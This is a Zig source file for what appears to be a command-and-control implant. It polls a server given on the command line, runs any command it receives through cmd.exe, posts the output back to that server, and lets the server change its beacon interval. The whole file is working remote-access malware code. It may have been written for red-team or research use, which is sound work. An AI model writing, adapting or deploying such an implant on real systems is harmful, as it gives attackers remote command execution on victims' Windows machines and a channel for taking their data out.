const std = @import("std");
const uuid = @import("Uuid");
const print = std.debug.print;

const Data = struct {
    id: ?[]const u8,
    type: ?[]const u8,
    username: ?[]const u8,
    hostname: ?[]const u8,
    result: ?[]const u8,
};

//make sure to free the body outside of this function. I allocate it for you
pub fn webrequest(allocator: std.mem.Allocator, uri: std.Uri, json_payload: []u8) ![]u8 {
    var client = std.http.Client{
        .allocator = allocator,
    };
    defer client.deinit();
    var headerBuffer: [1024]u8 = undefined;

    const requestOptions = std.http.Client.RequestOptions{
        .server_header_buffer = &headerBuffer,
    };

    var req = try client.open(.POST, uri, requestOptions);
    defer req.deinit();
    req.transfer_encoding = .{ .content_length = json_payload.len };

    try req.send();
    var wtr = req.writer();
    try wtr.writeAll(json_payload);
    try req.finish();

    try req.wait();

    var rdr = req.reader();
    const body = try rdr.readAllAlloc(allocator, 1024 * 1024 * 4);
    return body;
}

pub fn main() !void {
    // std.debug.print("All your {s} are belong to us.\n", .{"codebase"});

    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    const uri = try std.Uri.parse(args[1]);

    const id = try std.fmt.allocPrint(allocator, "{s}", .{uuid.V7.new()});
    defer allocator.free(id);

    var gpa2 = std.heap.GeneralPurposeAllocator(.{}){};
    const buffer_allocator = gpa2.allocator();

    const result = try buffer_allocator.alloc(u8, 4 * 1024 * 1024);
    defer buffer_allocator.free(result);

    var sleep: u64 = 2 * 1000 * 1000 * 1000;
    while (true) {
        defer std.time.sleep(sleep);

        const payload = Data{
            .id = id,
            .type = "zig",
            .username = null,
            .hostname = null,
            .result = null,
        };

        const json_payload = try std.json.stringifyAlloc(allocator, payload, .{ .whitespace = .indent_2 });
        defer allocator.free(json_payload);

        // print("request: {s}\n", .{json_payload});

        const body = try webrequest(allocator, uri, json_payload);
        defer allocator.free(body);

        // print("response: {d} {s}\n", .{ body.len, body });

        if (body.len == 2) {
            continue;
        }
        const Command_type = struct { sleep: ?[]const u8 = null, command: ?[]const u8 = null, __type__: ?[]const u8 = null };

        const command_val = try std.json.parseFromSlice(Command_type, allocator, body, .{ .ignore_unknown_fields = true });
        defer command_val.deinit();

        // print("command: {s}\n", .{command_val.value.__type__.?});
        const Case = enum { my_what, my_terminal, my_sleep };
        const case = std.meta.stringToEnum(Case, command_val.value.__type__ orelse {
            print("unknown command", .{});
            continue;
        });
        switch (case.?) {
            .my_what => {
                //std.mem.copyForwards(u8, result, "hello from zig\n");
                const command_result = try std.fmt.allocPrint(allocator, "hello from zig\n", .{});

                const payload_command = Data{
                    .id = id,
                    .type = "zig",
                    .username = null,
                    .hostname = null,
                    .result = command_result,
                };

                const command_payload = try std.json.stringifyAlloc(allocator, payload_command, .{ .whitespace = .indent_2 });
                defer allocator.free(command_payload);

                const resp = try webrequest(allocator, uri, command_payload);
                defer allocator.free(resp);
            },
            .my_sleep => {
                sleep = try std.fmt.parseUnsigned(u64, command_val.value.sleep.?, 10) * 1000 * 1000 * 1000;
                //std.mem.copyForwards(u8, result, "sleep changed \n");
                const command_result = try std.fmt.allocPrint(allocator, "sleep changed to {d}\n", .{sleep});

                const payload_command = Data{
                    .id = id,
                    .type = "zig",
                    .username = null,
                    .hostname = null,
                    .result = command_result,
                };

                const command_payload = try std.json.stringifyAlloc(allocator, payload_command, .{ .whitespace = .indent_2 });
                defer allocator.free(command_payload);

                const resp = try webrequest(allocator, uri, command_payload);
                defer allocator.free(resp);
            },
            .my_terminal => {
                const argv = [_][]const u8{ "cmd.exe", "/c", command_val.value.command.? };

                const proc = try std.ChildProcess.run(.{ .max_output_bytes = 4 * 1024 * 1024 - 1, .allocator = allocator, .argv = &argv, .cwd = "C:\\Windows\\System32" });

                // on success, we own the output streams
                defer allocator.free(proc.stdout);
                defer allocator.free(proc.stderr);

                const payload_command = Data{
                    .id = id,
                    .type = "zig",
                    .username = null,
                    .hostname = null,
                    .result = proc.stdout,
                };

                const command_payload = try std.json.stringifyAlloc(allocator, payload_command, .{ .whitespace = .indent_2 });
                defer allocator.free(command_payload);

                const resp = try webrequest(allocator, uri, command_payload);
                defer allocator.free(resp);
            },
        }
        // print("ran {s}", .{result});
    }
}
